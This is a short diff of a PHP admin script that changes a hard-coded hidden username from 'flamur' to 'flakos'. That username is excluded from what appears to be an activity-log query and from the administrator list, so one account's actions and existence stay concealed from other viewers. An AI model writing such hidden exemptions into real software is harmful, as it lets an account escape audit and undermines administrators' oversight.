@@ -16,7 +16,7 @@ try {
 
     $where = [];
     $params = [];
-    $hiddenUsername = "flamur";
+    $hiddenUsername = "flakos";
 
     $where[] = "LOWER(COALESCE(actor_username, '')) <> ?";
     $params[] = $hiddenUsername;
@@ -64,7 +64,7 @@ try {
     $stmt->execute($params);
 
     $admins = $conn
-        ->query("SELECT id, username, role FROM admins WHERE LOWER(username) <> 'flamur' ORDER BY username ASC")
+        ->query("SELECT id, username, role FROM admins WHERE LOWER(username) <> 'flakos' ORDER BY username ASC")
         ->fetchAll(PDO::FETCH_ASSOC);
 
     $hiddenAdminIdsStmt = $conn->prepare("SELECT id FROM admins WHERE LOWER(username) = ?");
